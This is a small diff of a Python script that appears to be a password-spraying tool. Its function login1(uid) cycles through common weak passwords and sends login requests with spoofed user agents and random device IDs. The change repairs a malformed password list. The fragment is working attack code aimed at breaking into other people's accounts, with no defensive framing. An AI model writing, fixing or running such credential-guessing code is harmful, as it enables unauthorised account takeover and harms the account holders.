@@ -770,7 +770,7 @@ def login1(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222"ALI786","]:
+        for pw in ["123456","1234567","12345678","123456789","111222"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
